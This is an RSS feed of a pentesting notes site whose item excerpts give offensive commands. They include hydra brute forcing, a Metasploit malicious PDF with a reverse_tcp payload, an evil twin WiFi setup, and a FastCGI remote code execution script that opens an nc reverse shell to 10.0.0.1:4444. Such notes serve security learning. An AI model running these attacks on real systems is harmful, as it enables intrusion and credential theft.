<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Network on D0CUM3NTN4T10N</title>
    <link>https://documentnation.github.io/tags/network/</link>
    <description>Recent content in Network on D0CUM3NTN4T10N</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Sat, 23 Dec 2023 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://documentnation.github.io/tags/network/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Anonymize Traffic with Tor</title>
      <link>https://documentnation.github.io/docs/hdks/network/attack/anonymize-traffic-with-tor/</link>
      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/attack/anonymize-traffic-with-tor/</guid>
      <description>Privacy Friendly OS link Tails Qubes Whonix Anonymization link1. Configure Proxychains linkFirst off, find the location of the proxychains configuration file.&#xA;find / -type f -name &amp;#34;*proxychains*&amp;#34; 2&amp;gt;/dev/null Assume we found /etc/proxychains.conf then modify this file.&#xA;vim /etc/proxychains We need to remove # in front of dynamic_chains, then comment out the strict_chain line and the random_chain line.&#xA;In addition, check the proxy_dns is uncommented for avoiding our DNS to be leaked.</description>
    </item>
    <item>
      <title>OSINT (Open Source Intelligence)</title>
      <link>https://documentnation.github.io/docs/hdks/reconnaissance/osint/</link>
      <pubDate>Fri, 03 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reconnaissance/osint/</guid>
      <description>Automation linkOSINT is a powerful method for investigating target organizations, websites, etc. However, it&amp;rsquo;s the tedious task to surfin the internet for finding desired information one by one. For that reason, it&amp;rsquo;s also recommended to use automation tools.&#xA;*It might overlap a bit with recon automation tools&#xA;BBOT&#xA;A powerful subdomain scanner and port mapper.&#xA;Blackbird&#xA;Searches accounts by username in social networks.&#xA;Maltego&#xA;A comprehensive tool for information gathering.</description>
    </item>
    <item>
      <title>FTP (File Transfer Protocol) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/ftp-pentesting/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/ftp-pentesting/</guid>
      <description>Enumeration link nmap --script ftp-anon -p 21 &amp;lt;target-ip&amp;gt; nmap --script ftp-vuln* -p 21 &amp;lt;target-ip&amp;gt; nmap --script ftp-* -p 21 &amp;lt;target-ip&amp;gt; Brute Force Credentials link hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; ftp hydra -L username.txt -p password &amp;lt;target-ip&amp;gt; ftp hydra -l username -P passwords.txt ftp://&amp;lt;target-ip&amp;gt; hydra -L usernames.txt -p password ftp://&amp;lt;target-ip&amp;gt; Investigation linkBanner Grabbing link nc &amp;lt;target-ip&amp;gt; 21 Using OpenSSL linkFirst off, open listener.&#xA;nc -vn &amp;lt;target-ip&amp;gt; 21 Then run the command below.</description>
    </item>
    <item>
      <title>SNMP (Simple Network Management Protocol) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/snmp-pentesting/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/snmp-pentesting/</guid>
      <description>Enumeration link nmap -sU --script snmp-info -p 161 &amp;lt;target-ip&amp;gt; nmap -sU --script snmp-interfaces -p 161 &amp;lt;target-ip&amp;gt; nmap -sU --script snmp-processes -p 161 &amp;lt;target-ip&amp;gt; nmap -sU --script snmp-sysdescr -p 161 &amp;lt;target-ip&amp;gt; nmap -sU --script snmp* -p 161 &amp;lt;target-ip&amp;gt; Snmp-Check linkSnmp-Check is SNMP enumerator.&#xA;# -c: community # -p: port snmp-check &amp;lt;target-ip&amp;gt; -p 161 -c public If we found the community name, brute force it.&#xA;Brute Force the Community Names link hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.</description>
    </item>
    <item>
      <title>SSH (Secure Shell) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/ssh-pentesting/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/ssh-pentesting/</guid>
      <description>Enumeration link nmap --script ssh-brute -p 22 &amp;lt;target-ip&amp;gt; nmap --script ssh-auth-methods --script-args=&amp;#34;ssh.user=username&amp;#34; -p 22 &amp;lt;target-ip&amp;gt; nmap --script ssh-* -p 22 &amp;lt;target-ip&amp;gt; # User enumeration msfconsole msf&amp;gt; use auxiliary/scanner/ssh/ssh_enumusers Brute Force Credentials link # -t: tasks hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; ssh -t 4 hydra -L usernames.txt -p password &amp;lt;target-ip&amp;gt; ssh -t 4 # Specific ports hydra -l username -P passwords.txt -s 2222 &amp;lt;target-ip&amp;gt; ssh -t 4 hydra -l username -P passwords.</description>
    </item>
    <item>
      <title>Telnet Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/telnet-pentesting/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/telnet-pentesting/</guid>
      <description>Enumeration link nmap --script telnet-encryption -p 23 &amp;lt;target-ip&amp;gt; nmap --script telnet-ntlm-info -p 23 &amp;lt;target-ip&amp;gt; nmap --script telnet-brute --script-args userdb=users.txt,passdb=passwords.txt,telnet-brute.timeout=8s -p 23 &amp;lt;target-ip&amp;gt; Configuration Files link cat /etc/inetd.conf # or cat /etc/xinetd.d/telnet Connect link telnet &amp;lt;target-ip&amp;gt; &amp;lt;target-port&amp;gt; telnet &amp;lt;target-ip&amp;gt; 23 </description>
    </item>
    <item>
      <title>TFTP (Trivial File Transfer Protocol) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/tftp-pentesting/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/tftp-pentesting/</guid>
      <description>Enumeration link nmap -sU --script tftp-enum -p 69 &amp;lt;target-ip&amp;gt; Configuration Files link cat /etc/inetd.conf # or cat /etc/xinetd.d/tftp </description>
    </item>
    <item>
      <title>NFS (Network File System) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/nfs-pentesting/</link>
      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/nfs-pentesting/</guid>
      <description>Enumeration link nmap --script=nfs-ls,nfs-statfs,nfs-showmount -p 111,2049 &amp;lt;target-ip&amp;gt; Mounting Folders link1. Check if there are folders avaiable to mount in remote machine. link showmount -e &amp;lt;target-ip&amp;gt; By the way, If you get error &amp;ldquo;showmount: command not found&amp;rdquo;, install nfs-common.&#xA;apt-cache search showmount sudo apt install nfs-common 2. Mount to local folder linkIf we find a folder available, we can mount it to local folder.&#xA;Create a new folder under /mnt.&#xA;sudo mkdir /mnt/test Now mount a folder.</description>
    </item>
    <item>
      <title>Port Scan</title>
      <link>https://documentnation.github.io/docs/hdks/reconnaissance/port-scan/</link>
      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reconnaissance/port-scan/</guid>
      <description>Nmap linkNmap is still the most commonly used tool when scanning ports of the target system.&#xA;But in recent years, some other tools, such as masscan or rustscan, are also becoming popular because the tools scan faster than nmap.&#xA;Basic Scan linkIt&amp;rsquo;s recommened to do as stealth scan (SYN scan) by adding the option -sS.&#xA;Also it&amp;rsquo;s prefered to add -T2 flag for being polite.&#xA;sudo nmap -sS &amp;lt;target-ip&amp;gt; sudo nmap -sS &amp;lt;target-ip&amp;gt; -T2 # -V: OS version detection # -C: Default NSE sudo nmap -sSVC &amp;lt;target-ip&amp;gt; # -A: All detection sudo nmap -sS -A &amp;lt;target-ip&amp;gt; Skipping the host discovery</description>
    </item>
    <item>
      <title>Tshark Cheat Sheet</title>
      <link>https://documentnation.github.io/docs/hdks/network/tool/tshark-cheat-sheet/</link>
      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/tool/tshark-cheat-sheet/</guid>
      <description>Basic Capture link tshark # -i: interface (default: eth0) tshark -i tun0 # --list-interface: List interfaces available tshark --list-interfaces # -r: Use a captured file tshark -r example.pcapng # Number of packets tshark -r example.pcapng | wc -l Filtering linkWe can filter packets using -Y option.&#xA;Protocols link # HTTP tshark -Y &amp;#39;http&amp;#39; # ICMP tshark -Y &amp;#39;icmp&amp;#39; # TCP/UDP tshark -Y &amp;#39;tcp&amp;#39; tshark -Y &amp;#39;udp&amp;#39; IP Address link tshark -Y &amp;#39;ip.</description>
    </item>
    <item>
      <title>ReDoS (Regular Expression Denial of Service)</title>
      <link>https://documentnation.github.io/docs/hdks/network/redos/</link>
      <pubDate>Thu, 12 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/redos/</guid>
      <description>Evil (Vulnerable) Regex link (a&amp;#43;)&amp;#43; ([a-zA-Z]&amp;#43;)* (a|aa)&amp;#43; (a|a?)&amp;#43; (.*a){x} for x \&amp;gt; 10 ^(([a-z])&amp;#43;.)&amp;#43;[A-Z]([a-z])&amp;#43;$ &amp;lt;!-- https://regexlib.com/REDetails.aspx?regexp_id=1757&amp;amp;AspxAutoDetectCookieSupport=1 --&amp;gt; /^([a-zA-Z0-9])(([\-.]|[_]&amp;#43;)?([a-zA-Z0-9]&amp;#43;))*(@){1}[a-z0-9]&amp;#43;[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$/ Malicious Input linkIf a target website validates user input with the above vulnerable Regex, we may be able to compromise the target system by the following malicious input:&#xA;aaaaaaaaaaaaaaaaaaaaaaaa! </description>
    </item>
    <item>
      <title>DoS/DDoS Attack</title>
      <link>https://documentnation.github.io/docs/hdks/network/attack/dos-ddos-attack/</link>
      <pubDate>Wed, 27 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/attack/dos-ddos-attack/</guid>
      <description>Comprehensive Tools link LOIC (Low Orbit Ion Cannon)&#xA;A network stress tool written in C#.&#xA;MHDDoS&#xA;A DDoS Attack Script written in Python3 with 56 methods.&#xA;UDP Flood Attack link Python-UDP-Flood&#xA;stress-udp-flood.c&#xA;This is a C code to stress test for UDP flood.&#xA;NTP (Network Time Protocol) Amplification Attack linkThis attack often uses monlist command for sending packets to target without authentication.&#xA;Low and Slow Attack (Slow HTTP Attack) linkLow and Slow Attack sends traffic slowly then makes it impossible the legitimate user to access the web service.</description>
    </item>
    <item>
      <title>Convert PuTTY Key to OpenSSH Key</title>
      <link>https://documentnation.github.io/docs/hdks/network/tool/convert-putty-key-to-openssh-key/</link>
      <pubDate>Fri, 01 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/tool/convert-putty-key-to-openssh-key/</guid>
      <description>Install PuTTYgen linkIf you don’t have putty-tools on Linux, install it at first.&#xA;# Install in Linux sudo apt install putty-tools If you use puttygen on Windows, install the PuTTYgen in the official page.&#xA;Generate Key Pair link # -t: key type # -b: number of bits # -C: key comment # -o: output file puttygen -t rsa -b 2084 -C &amp;#34;user@example.com&amp;#34; -o keyfile.ppk PuTTY to SSH Key linkIf you use puttygen on Linux, run the following command to convert PuTTY key to OpenSSH keys (private/public).</description>
    </item>
    <item>
      <title>Honeypots</title>
      <link>https://documentnation.github.io/docs/hdks/network/honeypots/</link>
      <pubDate>Sun, 06 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/honeypots/</guid>
      <description>Detecting Honeypot linkWhen entered target system, then if we felt something is wrong. For example,&#xA;Cannot execute common OS commands e.g. ls, cat, etc. There are few files under /home/&amp;lt;user&amp;gt; unnaturally. There are few users or uncommon users exist in /etc/passwd unnaturally. Found either cowrie-env, cowrie.cfg, tpot.yml, dionaea.cfg in system. We may be able to suspect the system is a honeypot.&#xA;Cowrie linkCowrie is an SSH/Telnet honeypot.&#xA;Directories &amp;amp; Files link etc/cowrie.</description>
    </item>
    <item>
      <title>RTSP (Real Time Streaming Protocol) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/rtsp-pentesting/</link>
      <pubDate>Sun, 06 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/rtsp-pentesting/</guid>
      <description>Enumeration link nmap --script rtsp-* -p 554,8554 &amp;lt;target-ip&amp;gt; Default Credential link admin:admin admin:12345 Watch RTSP Stream using VLC Media Player linkReference: https://www.youtube.com/watch?v=ksUylvdJQDQ&#xA;We might be able to watch RTSP stream using a media player such as VLC. Here is the example for VLC.&#xA;First off, if we don’t have the VLC Media Player, we need to install it by the following command.&#xA;sudp apt install vlc Then open VLC, follow these steps:</description>
    </item>
    <item>
      <title>Splunk Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/malware/splunk-pentesting/</link>
      <pubDate>Thu, 03 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/malware/splunk-pentesting/</guid>
      <description>Default Credentials link admin:changeme SPL (Search Processing Language) linkIn Splunk, click Search &amp;amp; Reporting. Maybe we need to set the “All time” Preset on the right of the search form.&#xA;The cheat sheet of searching is below:&#xA;# &amp;#34;main&amp;#34; index stores all the processed data index=&amp;#34;main&amp;#34; earliest=0 Files link index=main example.aspx sourcetype=&amp;#34;&amp;lt;SourceType&amp;gt;&amp;#34; EventCode link # EventCode 8: CreateRemoteThread in sysmon. index=&amp;#34;main&amp;#34; sourcetype=&amp;#34;&amp;lt;SourceType&amp;gt;&amp;#34; EventCode=8 # EventCode 11: FileCreate in sysmon. index=&amp;#34;main&amp;#34; sourcetype=&amp;#34;&amp;lt;SourceType&amp;gt;&amp;#34; EventCode=11 IP Addresses link index=main SourceIp=172.</description>
    </item>
    <item>
      <title>WiFi Hacking</title>
      <link>https://documentnation.github.io/docs/hdks/network/wifi/wifi-hacking/</link>
      <pubDate>Thu, 03 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/wifi/wifi-hacking/</guid>
      <description>Investigation linkOnline Tools link WiGLE&#xA;Wireless Network Mapping. If you have the BSSID, you can get the location.&#xA;You need to create an account to use the advanced search.&#xA;Check Status link Retrieve the Device IP Address&#xA;# IP address ip addr # IP address - Show the specific interface only ip addr show eth0 ip addr show eth1 ip addr show tun0 # IPv4 only ip -4 addr # IPv6 only ip -6 addr # Static route ip route Delete Network Interfaces From Your Devices</description>
    </item>
    <item>
      <title>Adobe PDF Attack</title>
      <link>https://documentnation.github.io/docs/hdks/network/attack/adobe-pdf-attack/</link>
      <pubDate>Mon, 24 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/attack/adobe-pdf-attack/</guid>
      <description>Exploitation using Metasploit linkThe PDF created by this process can be easily detected by modern Windows built-in antivirus. So this exploitation may be not useful for attackers.&#xA;1. Create a PDF linkAttackers can create a malicious PDF using metasploit.&#xA;msfconsole msf&amp;gt; use exploit/windows/fileformat/adobe_pdf_embedded_exe # Set payload for windows if target machine is windows msf&amp;gt; set payload windows/x64/meterpreter/reverse_tcp # Set the attacker&amp;#39;s ip address msf&amp;gt; set lhost 10.0.0.1 # Change filename msf&amp;gt; set filename supersafe.</description>
    </item>
    <item>
      <title>Evil Twin Attack</title>
      <link>https://documentnation.github.io/docs/hdks/network/wifi/evil-twin-attack/</link>
      <pubDate>Sat, 15 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/wifi/evil-twin-attack/</guid>
      <description>Exploitation link1. Build a Fake WiFi Hotspot linkFirst off, attackers need to connect public WiFi e.g. Free WiFi on cafes. Then set up the mobile hot spot on their PC. On Windows, attackers can easily setup the Mobil Hot Spot. See the official docs for details.&#xA;To impersonate as public Free WiFi, attackers need to set the same SSID and password as the legitimate WiFi. Otherwise, set the similar SSID or easy to connect name (e.</description>
    </item>
    <item>
      <title>WiFi Password Recovery</title>
      <link>https://documentnation.github.io/docs/hdks/network/wifi/wifi-password-recovery/</link>
      <pubDate>Sat, 15 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/wifi/wifi-password-recovery/</guid>
      <description>Windows linkOpen Command Prompt as root privilege like Administrator.&#xA;# Show all network names you&amp;#39;ve accessed and saved netsh wlan show profile # Show the details of the specific network including password netsh wlan show profile name=&amp;#34;network-name&amp;#34; key=clear Linux link ls -al /etc/NetworkManager/system-connections/ cat /etc/NetworkManager/system-connections/example.nmconnection </description>
    </item>
    <item>
      <title>OpenVPN Troubleshooting</title>
      <link>https://documentnation.github.io/docs/hdks/network/vpn/openvpn-troubleshooting/</link>
      <pubDate>Tue, 30 May 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/vpn/openvpn-troubleshooting/</guid>
      <description>Set Correct MTU (Maximum Transmission Unit) link Get correct MTU&#xA;Start Ping at the 1500 mtu and decrease the 1500 value by 10 each time.&#xA;On Linux,&#xA;# -M: mtu discovery # -s: data size ping -M do -s 1500 -c 1 &amp;lt;target-ip&amp;gt; # if the packet loss, ping -M do -s 1490 -c 1 &amp;lt;target-ip&amp;gt; # if the packet loss yet, ping -M do -s 1480 -c 1 &amp;lt;target-ip&amp;gt; # if packet loss yet, ping -M do -s 1470 -c 1 &amp;lt;target-ip&amp;gt; # continue until packet is received.</description>
    </item>
    <item>
      <title>gRPC Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/grpc-pentesting/</link>
      <pubDate>Sun, 28 May 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/grpc-pentesting/</guid>
      <description>Connect with grpcui linkgrpcui is an interactive web UI for gRPC.&#xA;If you don’t have grpcui, you need to install it.&#xA;go install github.com/fullstorydev/grpcui/cmd/grpcui@latest Then we can interact with gRPC.&#xA;grpcui -plaintext example.com:9019 </description>
    </item>
    <item>
      <title>Port Forwarding with Chisel</title>
      <link>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-chisel/</link>
      <pubDate>Sat, 20 May 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-chisel/</guid>
      <description>Transfer Chisel Binary to Remote Machine linkIf the remote machine does not have chisel binary, we need to transfer it from local machine (if local machine has the binary).&#xA;# In local machine python3 -m http.server --directory /path/to/chisel/directory # In remote machine wget http://&amp;lt;local-ip&amp;gt;:8000/chisel chmod &amp;#43;x chisel ./chisel -h Port Forwarding link # In remote machine chisel server -p &amp;lt;listen-port&amp;gt; # In local machine chisel client &amp;lt;listen-ip&amp;gt;:&amp;lt;listen-port&amp;gt; &amp;lt;local-port&amp;gt;:&amp;lt;target-ip&amp;gt;:&amp;lt;target-port&amp;gt; Reverse Port Forwarding linkIt is useful when we want to access to the host &amp;amp; the port that cannot be directly accessible from local machine.</description>
    </item>
    <item>
      <title>Wireshark Cheat Sheet</title>
      <link>https://documentnation.github.io/docs/hdks/network/tool/wireshark-cheat-sheet/</link>
      <pubDate>Fri, 21 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/tool/wireshark-cheat-sheet/</guid>
      <description>Settings linkDatetime Format When Packets Sent linkSelect “View → Time Display Format → Date and Time of Day”.&#xA;Filters linkEnter the following text in a filtering form.&#xA;Datetime link frame.time &amp;gt;= &amp;#34;Jan 2, 2023 08:00:00&amp;#34; &amp;amp;&amp;amp; frame.time &amp;lt;= &amp;#34;Jan 5, 2023 08:00:00&amp;#34; DNS link dns udp.port == 53 # Record type dns.qry.type == 1 # A record dns.qry.type == 2 # NS record dns.qry.type == 5 # CNAME record dns.qry.type == 6 # SOA record dns.</description>
    </item>
    <item>
      <title>Linux Pivoting</title>
      <link>https://documentnation.github.io/docs/hdks/linux/post-exploitation/linux-pivoting/</link>
      <pubDate>Sun, 16 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/post-exploitation/linux-pivoting/</guid>
      <description>Enumerate Network in Remote Machine linkAfter entering remote machine, we can enumerate and search other networks.&#xA;Before that if the target machine does not have nmap, we can upload the binary to target machine.&#xA;# Linux 64-bit wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap When we&amp;rsquo;re ready, let&amp;rsquo;s investigate the network as follow.&#xA;# ARP cache arp -a # Network hosts, ip addresses cat /etc/hosts cat /etc/resolv.conf nmcli dev show # Network ranges nmap 10.0.0.1-255 nmap 172.</description>
    </item>
    <item>
      <title>FastCGI Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/fastcgi-pentesting/</link>
      <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/fastcgi-pentesting/</guid>
      <description>Investigation linkIf the PHP-FPM (FastCGI Process Manager) is running on the target system, we might be able to execute arbitrary command.&#xA;ps aux | cat php-fpm: pool username Remote Code Execution linkReference: https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi&#xA;We need to create an arbitrary PHP file somewhere. For instance,&#xA;touch /dev/shm/index.php Then create a shell script named &amp;ldquo;exploit.sh&amp;rdquo;.&#xA;#!/bin/bash PAYLOAD=&amp;#34;&amp;lt;?php echo &amp;#39;&amp;lt;!--&amp;#39;; system(&amp;#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 4444 &amp;gt;/tmp/f&amp;#39;); echo &amp;#39;--&amp;gt;&amp;#39;;&amp;#34; FILENAMES=&amp;#34;/dev/shm/index.php&amp;#34; # Exisiting file path HOST=$1 B64=$(echo &amp;#34;$PAYLOAD&amp;#34;|base64) for FN in $FILENAMES; do OUTPUT=$(mktemp) env -i \ PHP_VALUE=&amp;#34;allow_url_include=1&amp;#34;$&amp;#39;\n&amp;#39;&amp;#34;allow_url_fopen=1&amp;#34;$&amp;#39;\n&amp;#39;&amp;#34;auto_prepend_file=&amp;#39;data://text/plain\;base64,$B64&amp;#39;&amp;#34; \ SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \ cgi-fcgi -bind -connect $HOST:9000 &amp;amp;&amp;gt; $OUTPUT cat $OUTPUT done Now execute the shell script.</description>
    </item>
    <item>
      <title>Apache Hadoop Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/apache-hadoop-pentesting/</link>
      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/apache-hadoop-pentesting/</guid>
      <description>Authenticate using Keytab linkKyetab files are used to authenticate to the KDC (key distribution center) on Kerberos authentication. To find them, execute the following command in target system.&#xA;find / -type f -name *.keytab 2&amp;gt;/dev/null After finding them, we can use them to gather information or authenticate.&#xA;# Gather information from a keytab # -k: Speicifed a keytab file klist -k /path/to/example.keytab # Authenticate to Kerberos server and request a ticket.</description>
    </item>
    <item>
      <title>Port Forwarding with Plink</title>
      <link>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-plink/</link>
      <pubDate>Sun, 19 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-plink/</guid>
      <description>Reverse Connection link1. Open Lisnter in Your Local Machine link nc -lvnp 4444 2. Run Reverse Connection in Target Machine linkFirst of all, generate SSH keys. Two keys (public and private) will be generated.&#xA;ssh-keygen Convert the private key for Windows.&#xA;puttygen private_key -o private_key.ppk Run reverse connection using plink.&#xA;cmd.exe /c echo y | .\plink.exe -R &amp;lt;attack-port&amp;gt;:&amp;lt;victim-ip&amp;gt;:&amp;lt;victim-port&amp;gt; attacker@&amp;lt;attack-ip&amp;gt; -i private_key.ppk -N </description>
    </item>
    <item>
      <title>Port Forwarding with Socat</title>
      <link>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-socat/</link>
      <pubDate>Sun, 19 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-socat/</guid>
      <description>Port Forwarding linkRun the following command in local machine.&#xA;socat tcp-listen:8080,fork tcp:&amp;lt;remote-ip&amp;gt;:80 With command above, we can access to http://localhost:8080/ and get the content of the remote website.&#xA;Port Forwarding (from Remote Machine) linkRun the following command in remote machine.&#xA;socat tcp-listen:1234,fork,reuseaddr tcp:localhost:8080 With command above, we can access to http://&amp;lt;remote-ip&amp;gt;:1234 in local machine, and get the content of the remote 8080 port.&#xA;Quiet Port Forwarding link1. Open Up Two Ports in Local Machine link socat tcp-listen:&amp;lt;local-port&amp;gt; tcp-listen:&amp;lt;remote-port&amp;gt;,fork,reuseaddr &amp;amp; 2.</description>
    </item>
    <item>
      <title>Port Forwarding with SSH</title>
      <link>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-ssh/</link>
      <pubDate>Sun, 19 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-ssh/</guid>
      <description>Local Port Forwarding linkWe can forward a port on the local machine to a port on the remote machine by adding the flag &amp;quot;-L&amp;quot; with SSH.&#xA;Also, it is required the remote SSH username/password.&#xA;ssh -L [&amp;lt;local-ip&amp;gt;:]&amp;lt;local-port&amp;gt;.&amp;lt;destination-ip&amp;gt;:&amp;lt;destination-port&amp;gt; remote-user@&amp;lt;remote-ip&amp;gt; # -f: Background # -N Do not execute remote commands ssh -L [&amp;lt;local-ip&amp;gt;:]&amp;lt;local-port&amp;gt;:&amp;lt;destination-ip&amp;gt;:&amp;lt;destination-port&amp;gt; remote-user@&amp;lt;remote-ip&amp;gt; -fN Examples linkBelow are some examples.&#xA;# We can access the internal webserver in the remote machin via http://127.</description>
    </item>
    <item>
      <title>IRC (Internet Relay Chat) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/irc-pentesting/</link>
      <pubDate>Sun, 26 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/irc-pentesting/</guid>
      <description>Enumeration link nmap --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194 &amp;lt;ip&amp;gt; </description>
    </item>
    <item>
      <title>UPnP (Universal Plug and Play) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/upnp-pentesting/</link>
      <pubDate>Sat, 25 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/upnp-pentesting/</guid>
      <description>Enumeration link nmap -sU --script upnp-info -p 1900 &amp;lt;ip&amp;gt; nmap --script upnp-info -p 5000 &amp;lt;ip&amp;gt; nmap --script broadcast-upnp-info -p 1900 &amp;lt;ip&amp;gt; </description>
    </item>
    <item>
      <title>Rsync Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/rsync-pentesting/</link>
      <pubDate>Mon, 06 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/rsync-pentesting/</guid>
      <description>Enumeration link nmap --script rsync-list-modules -p 873 &amp;lt;target-ip&amp;gt; nmap --script rsync-brute --script-args &amp;#39;rsync-brute.module=www&amp;#39; &amp;lt;target-ip&amp;gt; # Banner grabbing and list shared folders # We can execute commands (modules) that we found, after entering &amp;#39;@RSYNCD: &amp;lt;version&amp;gt;&amp;#39;. nc -nv &amp;lt;target-ip&amp;gt; 873 @RSYNCD: 31.0 #list raidroot Conf @RSYNCD: EXIT # List sync data using rsync rsync &amp;lt;target-ip&amp;gt;:: rsync -av --list-only rsync://&amp;lt;target-ip&amp;gt; # List sync data using Metasploit msf&amp;gt; use auxiliary/scanner/rsync/modules_list When we found the shared folder, check if we can connect without authentication.</description>
    </item>
    <item>
      <title>VNC (Virtual Network Computing) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/vnc-pentesting/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/vnc-pentesting/</guid>
      <description>Enumeration link nmap --script vnc-info -p 5900 &amp;lt;target-ip&amp;gt; # RealVNC authentication bypass (CVE-2006-2369) nmap --script realvnc-auth-bypass -p 5900 &amp;lt;target-ip&amp;gt; msf&amp;gt; use auxiliary/scanner/vnc/vnc_none_auth Brute Force Credentials linkVNC server does not use the username, but only the password.&#xA;hydra -P passwords.txt vnc://&amp;lt;target-ip&amp;gt; hydra -P passwords.txt &amp;lt;target-ip&amp;gt; vnc Connect link remmina remmina -c vnc://&amp;lt;target-ip&amp;gt; remmina -c vnc://username@vulnerable.com remmina -c vnc:vulnerable.com?VncUsername=username remmina -c vnc://username:password@vulnerable.com remmina -c vnc://vulnerable.com?VncUsername=username\&amp;amp;VncPassword=password </description>
    </item>
    <item>
      <title>Windows Pivoting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/post-exploitation/window-pivoting/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/post-exploitation/window-pivoting/</guid>
